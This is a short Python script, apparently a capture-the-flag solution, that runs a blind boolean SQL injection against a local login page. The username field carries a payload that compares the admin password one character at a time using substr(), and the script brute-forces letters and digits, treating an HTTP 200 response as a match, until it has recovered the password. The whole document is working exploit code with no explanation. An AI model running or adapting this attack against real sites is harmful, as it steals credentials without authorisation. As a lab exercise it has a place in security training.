import requests

flag = [''] * 100

def query(pos, character):
    if(requests.post("http://challenge.localhost/", data={
        "username": f"admin' AND substr((SELECT password FROM users WHERE username = 'admin'), {pos}, 1) = '{character}' --",
        "password": "123"
    }).status_code == 200): 
        flag[pos] = character

for i in range(0, 60):
    for j in range(ord('a'),ord('z') + 1):
        query(i,chr(j))
    for j in range(ord('A'),ord('Z') + 1):
        query(i,chr(j))
    for j in range(ord('0'),ord('9') + 1):
        query(i,chr(j))

print(flag)